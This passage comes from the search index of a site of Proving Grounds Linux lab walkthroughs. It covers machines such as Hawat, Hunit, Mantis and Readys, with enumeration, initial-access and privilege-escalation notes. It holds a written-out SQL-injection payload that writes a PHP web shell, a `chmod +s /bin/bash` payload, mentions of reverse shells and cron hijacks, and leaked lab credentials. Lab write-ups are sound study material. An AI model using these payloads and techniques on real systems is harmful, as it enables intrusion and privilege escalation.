\ud83d\udd39","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"hawat/#enumeration","title":"Enumeration","text":"<p>Port <code>17445</code> shows a web page of an issue tracker.</p> <p></p> <p>We can register users and log in.</p> <p></p> <p>Port <code>30455</code> shows us a web page with no links.</p> <p></p> <p>Using <code>feroxbuster</code>, we find a <code>nextcloud</code> instance.</p> <p></p> <p></p> <p>Trying <code>admin:admin</code> works.</p> <p></p> <p>We find the issue tracker project in here.</p> <p></p> <p>Download and explore it, and we have the <code>mysql</code> password.</p> <p></p> <p><code>issue_user:ManagementInsideOld797</code></p> <p>We can see that the <code>priority</code> parameter is injectable in the <code>checkByPriority</code> function.</p> <p></p> <p>So going to the web...</p> <p></p> <p>GET is not allowed, so POST? Capture the request with <code>caido</code>.</p> <p>Changing GET to POST.</p> <p></p> <p>And adding the <code>priority</code> parameter, we got to <code>200</code>.</p> <p></p> <p>We saw with <code>feroxbuster</code> that there is a <code>phpinfo</code> that shows that the root path is <code>/srv/http</code>, so we can inject a webshell.</p> <p></p> <p>We can inject a web shell:</p> <pre><code>' union select '&lt;?php echo system($_REQUEST[\"bingo\"]); ?&gt;' into outfile '/srv/http/cmd.php' -- -\n</code></pre> <p></p> <p>Encode with https://www.url-encode-decode.com/</p> <p>Accessing the path...</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"hawat/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"hetemit/","title":"Hetemit \ud83d\udd38","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"hetemit/#enumeration","title":"Enumeration","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"hetemit/#initial-access","title":"Initial Access","text":"<p>Going to port <code>50000</code>, we have a Python API that shows...</p> <p></p> <p>At <code>/verify</code> we can inject code using <code>os.system()</code> because it is Python.</p> <p>Using <code>caido</code>.</p> <p></p> <p></p> <p>Get the flag.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"hetemit/#privilege-escalation","title":"Privilege Escalation","text":"<p>Checking with <code>linpeas</code>.</p> <p></p> <p></p> <p>We can reboot the system and write to that service.</p> <p></p> <p>It's impossible to edit the file without a fully interactive shell, so let's use <code>penelope</code>.</p> <p>https://github.com/brightio/penelope</p> <p></p> <p>Change the execution and the user.</p> <p></p> <p>We reboot and wait.</p> <p><code>sudo /sbin/reboot</code></p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"hetemit/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"hunit/","title":"Hunit \ud83d\udd38","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"hunit/#enumeration","title":"Enumeration","text":"<p>We have a blog at port <code>8080</code>.</p> <p></p> <p>At port <code>1830</code> there is a game.</p> <p></p> <p>In a post source code of port <code>8080</code> we see...</p> <p></p> <p>Now with <code>feroxbuster</code> we can fuzz.</p> <p></p> <p>The one that works is <code>/api/?</code>:</p> <p></p> <p></p> <pre><code>[\n  {\n    \"login\": \"rjackson\",\n    \"password\": \"yYJcgYqszv4aGQ\",\n    \"firstname\": \"Richard\",\n    \"lastname\": \"Jackson\",\n    \"description\": \"Editor\",\n    \"id\": 1\n  },\n  {\n    \"login\": \"jsanchez\",\n    \"password\": \"d52cQ1BzyNQycg\",\n    \"firstname\": \"Jennifer\",\n    \"lastname\": \"Sanchez\",\n    \"description\": \"Editor\",\n    \"id\": 3\n  },\n  {\n    \"login\": \"dademola\",\n    \"password\": \"ExplainSlowQuest110\",\n    \"firstname\": \"Derik\",\n    \"lastname\": \"Ademola\",\n    \"description\": \"Admin\",\n    \"id\": 6\n  },\n  {\n    \"login\": \"jwinters\",\n    \"password\": \"KTuGcSW6Zxwd0Q\",\n    \"firstname\": \"Julie\",\n    \"lastname\": \"Winters\",\n    \"description\": \"Editor\",\n    \"id\": 7\n  },\n  {\n    \"login\": \"jvargas\",\n    \"password\": \"OuQ96hcgiM5o9w\",\n    \"firstname\": \"James\",\n    \"lastname\": \"Vargas\",\n    \"description\": \"Editor\",\n    \"id\": 10\n  }\n]\n</code></pre>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"hunit/#initial-access","title":"Initial Access","text":"<p><code>ssh</code> with the admin from before and...</p> <p></p> <p>Get the flag.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"hunit/#privilege-escalation","title":"Privilege Escalation","text":"<p>Transfer <code>linpeas</code> and found...</p> <p></p> <p></p> <p></p> <p>We can pivot to user <code>git</code> using the private key but we don't have commands.</p> <p></p> <p>With the private key, we can execute <code>git</code> commands like clone the server repo.</p> <p></p> <p></p> <p>We can put a command in <code>backups.sh</code> that will be executed every 3 minutes.</p> <p></p> <p></p> <p>Wait and check <code>/bin/bash</code>.</p> <p></p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"hunit/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"lavita/","title":"Lavita \ud83d\udd38","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"lavita/#enumeration","title":"Enumeration","text":"<p>Page shows a template.</p> <p></p> <p><code>feroxbuster</code> finds a <code>register</code> path.</p> <p></p> <p>We can create an account and...</p> <p></p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"lavita/#initial-access","title":"Initial Access","text":"<p>Searching exploits for <code>laravel</code> and <code>debug</code>, we find https://github.com/rocketscientist911/CVE-2021-3129.</p> <p>We need to clone https://github.com/ambionics/phpggc.git to the same folder as the <code>.py</code> file and edit the exploit with the URL and the payload.</p> <p></p> <p></p> <p>Get the flag.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"lavita/#privilege-escalation","title":"Privilege Escalation","text":"<p>Using <code>pspy64</code>, we notice a task with the user <code>skunk</code> that uses <code>artisan</code>.</p> <p></p> <p>So we replace <code>artisan</code> with a PHP reverse shell.</p> <p></p> <p>Now using <code>sudo -l</code>...</p> <p></p> <p>This user can execute <code>composer</code> in that specific path, so reading on <code>gtfobins</code>...</p> <p></p> <p>I'll use the first user <code>www-data</code> to put the payload in the <code>composer.json</code>.</p> <p></p> <p>And now execute <code>composer</code> with <code>skunk</code>.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"lavita/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"levram/","title":"Levram \ud83d\udd39","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"levram/#enumeration","title":"Enumeration","text":"<p>At port <code>800</code> we have a login page for <code>gerapy</code>.</p> <p></p> <p>Testing <code>admin:admin</code> works.</p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"levram/#initial-access","title":"Initial Access","text":"<p><code>searchsploit</code> gives us the exploit for <code>gerapy</code>.</p> <p></p> <p>Create a project in the app and execute the script.</p> <p></p> <p>Get the flag.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"levram/#privilege-escalation","title":"Privilege Escalation","text":"<p>Transfer <code>linpeas</code>.</p> <p></p> <p><code>python</code> has capabilities so:</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"levram/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"mantis/","title":"Mantis \ud83d\udd38","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"mantis/#enumeration","title":"Enumeration","text":"<p>Web server shows a template of a landing page. <code>feroxbuster</code> discovers a <code>/bugtracker</code>.</p> <p></p> <p>Searching for an exploit, we find https://mantisbt.org/bugs/view.php?id=23173.</p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"mantis/#initial-access","title":"Initial Access","text":"<p>We start the rogue server from https://github.com/allyshka/Rogue-MySql-Server.</p> <p></p> <p>Visit <code>http://192.168.169.204/bugtracker/admin/install.php?install=3&amp;hostname=192.168.45.206</code></p> <p></p> <p>We can read config_inc.php file after seeing it in the mantis repo.</p> <p></p> <p>We have the database credentials.</p> <p> </p> <p><code>c7870d0b102cfb2f4916ff04e47b5c6f</code></p> <p>Using <code>hashcat</code>.</p> <p></p> <p></p> <p></p> <p>https://mantisbt.org/bugs/view.php?id=26091</p> <p></p> <p></p> <p></p> <p>Get the flag.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"mantis/#privilege-escalation","title":"Privilege Escalation","text":"<p>We see a backup script but can't see it; there is a cron job.</p> <p></p> <p>Using <code>pspy64</code>.</p> <p></p> <p>We see the password <code>BugTracker007</code>.</p> <p></p> <p><code>sudo -l</code> shows that <code>mantis</code> has full privileges, so...</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"mantis/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"marketing/","title":"Marketing \ud83d\udd38","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"marketing/#enumeration","title":"Enumeration","text":"<p>Web server is a marketing page.</p> <p></p> <p>Using <code>feroxbuster</code>, we find <code>/old</code> path.</p> <p></p> <p>Inside the old index, there is a new link.</p> <p></p> <p></p> <p>Add this to <code>/etc/hosts</code> and access it.</p> <p></p> <p>Going to <code>/admin</code>.</p> <p></p> <p>Searching default credentials.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"marketing/#initial-access","title":"Initial Access","text":"<p>We are in.</p> <p>Using this exploit https://github.com/Y1LD1R1M-1337/Limesurvey-RCE (recreate the zip after editing the reverse shell).</p> <p></p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"marketing/#privilege-escalation","title":"Privilege Escalation","text":"<p>Limesurvey config files show SQL credentials.</p> <p></p> <p></p> <p><code>sync.sh</code></p> <p></p> <p>Testing MySQL password with <code>t.miller</code> is a go.</p> <p></p> <p>Get the flag.</p> <p></p> <p>With <code>t.miller</code> we can execute <code>/usr/bin/sync.sh</code>.</p> <p></p> <p><code>t.miller</code> is a <code>staff</code> user and <code>mlocate</code> user.</p> <p>Transfer the database to Kali and inspect it, searching for the personal folder.</p> <p></p> <p>So we have to read <code>creds-for-2022.txt</code> but if we pass the path to the program, it is going to fail because of the...</p> <p></p> <p>...part, so we can disguise it with a symbolic link.</p> <p></p> <p></p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"marketing/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"mzeeav/","title":"Mzeeav \ud83d\udd38","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"mzeeav/#enumeration","title":"Enumeration","text":"<p>Web server shows a simple app that analyzes a file that you can upload.</p> <p></p> <p>Uploading a file.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"mzeeav/#initial-access","title":"Initial Access","text":"<p><code>feroxbuster</code> finds a <code>/backups</code> folder with a zip of the project.</p> <p></p> <p></p> <p></p> <p>It only checks the first four bytes, so we can add it to a PHP reverse shell.</p> <p></p> <p></p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"mzeeav/#privilege-escalation","title":"Privilege Escalation","text":"<p>We find a file in <code>/opt</code> with SUID that is the same as the <code>find</code> command. So search <code>find</code> in <code>gtfobins</code>.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"mzeeav/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"nibbles/","title":"Nibbles \ud83d\udd38","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"nibbles/#enumeration","title":"Enumeration","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"nibbles/#initial-access","title":"Initial Access","text":"<p>Searching, we find https://github.com/squid22/PostgreSQL_RCE.</p> <p>Clone, create <code>venv</code> and install requirements.</p> <p>Edit host and port and use port <code>80</code> on listener.</p> <p></p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"nibbles/#privilege-escalation","title":"Privilege Escalation","text":"<p>Get local flag.</p> <p></p> <p><code>find</code> has SUID privs.</p> <p></p> <p>Looking in <code>gtfobins</code>.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"nibbles/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"nukem/","title":"Nukem \ud83d\udd38","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"nukem/#enumeration","title":"Enumeration","text":"<p>On webserver port <code>80</code> there is a <code>WordPress</code> blog.</p> <p></p> <p>Another <code>WordPress</code> on port <code>13000</code>.</p> <p></p> <p>We scan <code>WordPress</code> with <code>wpscan</code> and we have...</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"nukem/#initial-access","title":"Initial Access","text":"<p>Going to the link, we get the script. We have to edit it and remove, in the payload section, the password thing.</p> <p></p> <p></p> <p>Now we have a web shell. Using <code>python</code>, we make a reverse shell.</p> <p></p> <p></p> <p>Get the flag.</p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"nukem/#privilege-escalation","title":"Privilege Escalation","text":"<p>Now, showing SUID programs, we have <code>dosbox</code> and searching in <code>gtfobins</code>.</p> <p></p> <p>We can write in root files.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"nukem/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"ochima/","title":"Ochima \ud83d\udd38","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"ochima/#enumeration","title":"Enumeration","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"ochima/#initial-access","title":"Initial Access","text":"<p>https://github.com/spookier/Maltrail-v0.53-Exploit/blob/main/exploit.py</p> <p></p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"ochima/#privilege-escalation","title":"Privilege Escalation","text":"<p>We notice an <code>etc_Backup.sh</code> that is being executed as <code>root</code>.</p> <p></p> <p></p> <p>So add a <code>nc</code> to us and wait.</p> <p></p> <p></p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"ochima/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"payday/","title":"Payday \ud83d\udd38","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"payday/#enumeration","title":"Enumeration","text":"<p>The web page is...</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"payday/#initial-access","title":"Initial Access","text":"<p>We can log in with <code>admin:admin</code>.</p> <p>Using <code>feroxbuster</code>, we discover <code>/admin</code> and using <code>admin:admin</code> we are inside.</p> <p></p> <p>Go to template editor and upload a PHP reverse shell with <code>.phtml</code> as seen in...</p> <p></p> <p>Once uploaded, go to <code>http://[victim]/skins/shell.phtml</code> after setting a reverse shell.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"payday/#privilege-escalation","title":"Privilege Escalation","text":"<p>Get <code>local.txt</code>.</p> <p></p> <p>Enumerating users, we see <code>patrick</code> and testing <code>patrick</code> with password <code>patrick</code>.</p> <p></p> <p>And <code>patrick</code> has all privileges.</p> <p></p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"payday/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"pc/","title":"Pc \ud83d\udd38","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"pc/#enumeration","title":"Enumeration","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"pc/#initial-access","title":"Initial Access","text":"<p>Going to port <code>8000</code>, we are in a terminal.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"pc/#privilege-escalation","title":"Privilege Escalation","text":"<p>We can see a script that opens port <code>65432</code>.</p> <p></p> <p></p> <p>Looking at the code, this is an <code>RPC</code> app.</p> <p></p> <p>Searching for <code>rpc</code> exploits:</p> <p>https://github.com/ehtec/rpcpy-exploit</p> <p>Change the payload to <code>chmod +s /bin/bash</code>.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"pc/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"pebbles/","title":"Pebbles \ud83d\udd39","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"pebbles/#enumeration","title":"Enumeration","text":"<p>Web page is...</p> <p></p> <p>And a <code>tomcat</code> at port <code>8080</code>.</p> <p></p> <p>With <code>feroxbuster</code> we found a <code>zm</code> folder that is a <code>zoneminder 1.29.0</code>.</p> <p></p> <p>Searching for vulnerabilities, we find...</p> <p></p> <p>There is a blind SQL vulnerability.</p> <p></p> <p>So we can put a PHP web shell.</p> <p></p> <p>And access port <code>3305</code>.</p> <p></p> <p>Bug</p> <p>Someone uploaded a reverse shell file and executed it but I can't get it to work.</p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"pelican/","title":"Pelican \ud83d\udd38","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"pelican/#enumeration","title":"Enumeration","text":"<p>We see an exhibitor for <code>zookeeper</code> on port <code>8080</code>.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"pelican/#initial-access","title":"Initial Access","text":"<p>Searching, we have:</p> <p></p> <p>So adding a <code>nc</code> in the correct field.</p> <p></p> <p>We have access.</p> <p></p> <p>Get the flag.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"pelican/#privilege-escalation","title":"Privilege Escalation","text":"<p>With <code>sudo -l</code> we can see <code>gcore</code> privileges.</p> <p></p> <p></p> <p>With <code>ps aux</code> we search for a process with password and see <code>password store</code>.</p> <p></p> <p>So using that PID, and then using <code>strings</code> on the file, we have a password.</p> <p></p> <p>Now we can execute commands as <code>root</code> (I couldn't switch to the user; next time use a bash connection instead of <code>nc</code>).</p> <p></p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"pelican/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"peppo/","title":"Peppo \ud83d\udd3a","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"peppo/#enumeration","title":"Enumeration","text":"<p>Port <code>8080</code> shows a <code>Redmine</code> service.</p> <p>Trying <code>admin:admin</code> at <code>/login</code> works. The system asks us to change the password, change it to <code>adminadmin</code>.</p> <p></p> <p>At port <code>10000</code> we have a...</p> <p></p> <p>Using <code>feroxbuster</code>, we discover some API actions.</p> <p></p> <p>We have <code>eleanor</code> user from <code>nmap</code>.</p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"peppo/#initial-access","title":"Initial Access","text":"<p>Trying <code>ssh</code> with <code>eleanor:eleanor</code>.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"peppo/#privilege-escalation","title":"Privilege Escalation","text":"<p>We are in a restricted bash and can't execute most commands.</p> <p></p> <p>Now we can use the commands, get the flag.</p> <p></p> <p><code>/bin/bash</code> to upgrade the shell.</p> <p>We have <code>/usr/bin/docker</code> command so https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-docker-socket</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"peppo/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"posfish/","title":"Postfish \ud83d\udd38","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"posfish/#enumeration","title":"Enumeration","text":"<p>Add <code>postfish.off</code> to <code>/etc/hosts</code>.</p> <p>Web server is a template.</p> <p></p> <p>With people.</p> <p></p> <p>Make a users file and put the names, also add the departments.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"posfish/#initial-access","title":"Initial Access","text":"<p>Using <code>hydra</code>, first use the same list for user and password.</p> <p></p> <p>We have <code>sales:sales</code>.</p> <p>We can install <code>evolution</code> and put the email to view emails.</p> <p></p> <p>Or with <code>pop3</code> port, connecting with <code>telnet</code>.</p> <p></p> <p>So we need to send an email looking as if it is from the user to the users. Start a listener on port <code>80</code> and execute <code>sendEmail</code>.</p> <p></p> <p><code>brian.moore:EternaLSunshinE</code></p> <p>We can try <code>ssh</code>.</p> <p></p> <p>Get the flag.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"posfish/#privilege-escalation","title":"Privilege Escalation","text":"<p>Execute <code>linpeas</code> and we see:</p> <p></p> <p></p> <p>This file executes <code>altermime</code> and adds content to all emails, so if we put a reverse shell and send the email...</p> <p></p> <p>Using <code>sudo -l</code>:</p> <p></p> <p></p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"posfish/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"quackerjack/","title":"Quackerjack \ud83d\udd38","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"quackerjack/#enumeration","title":"Enumeration","text":"<p>At port <code>8081</code> we have an <code>rconfig</code> service.</p> <p>Searching for an exploit, we find:</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"quackerjack/#initial-access","title":"Initial Access","text":"<p>The problem is that the final step, the execution of the reverse shell, is not working.</p> <p></p> <p>So we are going to use the created user and use another exploit from the inside.</p> <p>https://gist.github.com/FlatL1neAPT/c2a339ca76d0db05a281f2e6e77ad56c</p> <p>So upload in <code>vendors</code> a <code>shell.php</code>, capture the request with <code>caido</code> and put <code>image/gif</code> in content-type, then go to <code>/images/vendor/shell.php</code> to get a reverse shell.</p> <p></p> <p></p> <p></p> <p>Get the flag.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"quackerjack/#privilege-escalation","title":"Privilege Escalation","text":"<p>Get credentials.</p> <p></p> <p>Inside <code>mysql</code> we have the <code>admin</code> user.</p> <p></p> <p>Using <code>hashcat</code>.</p> <p></p> <p>Looking for SUID, we find:</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"quackerjack/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"readys/","title":"Readys \ud83d\udd38","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"readys/#enumeration","title":"Enumeration","text":"<p>Website at port <code>80</code> is a <code>WordPress</code> site.</p> <p></p> <p>Using <code>wpscan</code>, we find a local file inclusion in the plugin.</p> <p></p> <p></p> <p>So we have <code>alice</code> user.</p> <p>We can see the <code>redis</code> config at <code>/etc/redis/redis.conf</code>.</p> <p></p> <p>So we have <code>alice</code> user and the <code>redis</code> password <code>Ready4Redis?</code>.</p> <p>We can log in to <code>redis</code>.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"readys/#initial-access","title":"Initial Access","text":"<p>Searching for an RCE exploit:</p> <p>https://github.com/jas502n/Redis-RCE</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"readys/#privilege-escalation","title":"Privilege Escalation","text":"<p>Make another reverse shell for a more stable session.</p> <p></p> <p></p> <p><code>mysql</code> config:</p> <p></p> <p></p> <p><code>admin:$P$Ba5uoSB5xsqZ5GFIbBnOkXA0ahSJnb0</code></p> <p>Can't crack it.</p> <p>Transfer <code>linpeas.sh</code>.</p> <p></p> <p>Using <code>pspy64</code>, we see it.</p> <p></p> <p></p> <p>We can exploit the <code>tar</code> wildcard, but not with this user; we need <code>alice</code>.</p> <p>Find a writable folder to put a PHP file and execute it like before with LFI and get a reverse shell.</p> <p></p> <p></p> <p></p> <p></p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"readys/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flags.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"roquefort/","title":"Roquefort \ud83d\udd38","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"roquefort/#enumeration","title":"Enumeration","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"roquefort/#initial-access","title":"Initial Access","text":"<p>At port <code>3000</code> there is a <code>gitea</code> instance. We can create a user.</p> <p></p> <p>In the pre-receive hook, we can put a reverse shell.</p> <p></p> <p></p> <p>Get the flag.</p> 